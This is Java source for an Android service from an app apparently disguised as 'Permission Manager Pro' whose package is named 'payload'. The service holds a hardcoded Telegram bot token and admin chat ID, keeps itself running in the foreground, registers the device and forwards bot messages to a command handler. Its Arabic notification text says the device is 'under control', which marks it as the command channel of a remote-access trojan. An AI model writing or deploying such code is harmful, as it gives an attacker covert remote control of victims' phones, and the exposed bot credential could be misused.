package com.example.permissionmanagerpro.payload;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.example.permissionmanagerpro.R;
import com.example.permissionmanagerpro.ui.MainActivity;
import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.UpdatesListener;
import com.pengrad.telegrambot.model.Update;

public class TelegramBotService extends Service {
    private static final String TAG = "TelegramBotService";
    private static final String CHANNEL_ID = "BotChannel";
    private static final int NOTIFY_ID = 1001;

    // ===== غيّر هذه القيم =====
    private static final String BOT_TOKEN = "8767092209:AAEMftbLat64-Z7Tl1ZxTyTOMTVHhVyym_E";
    private static final String ADMIN_CHAT_ID = "8475863752"; // اتركها فارغة لقبول الكل

    private TelegramBot bot;
    private SessionManager sessionManager;
    private CommandHandler commandHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");

        sessionManager = new SessionManager(this);
        commandHandler = new CommandHandler(this, null, sessionManager); // سنربط البوت لاحقاً

        startForeground(NOTIFY_ID, createNotification());
        initializeBot();
    }

    private void initializeBot() {
        try {
            bot = new TelegramBot(BOT_TOKEN);
            commandHandler = new CommandHandler(this, bot, sessionManager);

            bot.setUpdatesListener(updates -> {
                for (Update update : updates) {
                    if (update.message() != null && update.message().text() != null) {
                        Long chatId = update.message().chat().id();
                        String text = update.message().text();

                        // تسجيل الجهاز الجديد
                        if (!sessionManager.isDeviceRegistered(String.valueOf(chatId))) {
                            sessionManager.addDevice(String.valueOf(chatId));
                            bot.execute(new com.pengrad.telegrambot.request.SendMessage(chatId, "🔗 تم تسجيل جهازك!"));
                        }

                        // فلترة المشرفين
                        if (!ADMIN_CHAT_ID.isEmpty() && !ADMIN_CHAT_ID.equals(String.valueOf(chatId))) {
                            bot.execute(new com.pengrad.telegrambot.request.SendMessage(chatId, "⚠️ غير مصرح لك."));
                            continue;
                        }

                        commandHandler.handle(chatId, text);
                    }
                }
                return UpdatesListener.CONFIRMED_UPDATES_ALL;
            });

            Log.d(TAG, "Bot connected.");
        } catch (Exception e) {
            Log.e(TAG, "Bot init failed", e);
        }
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Bot Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("🔒 Bot Active")
                .setContentText("الجهاز تحت السيطرة")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pi)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() { if (bot != null) bot.removeGetUpdatesListener(); super.onDestroy(); }
}
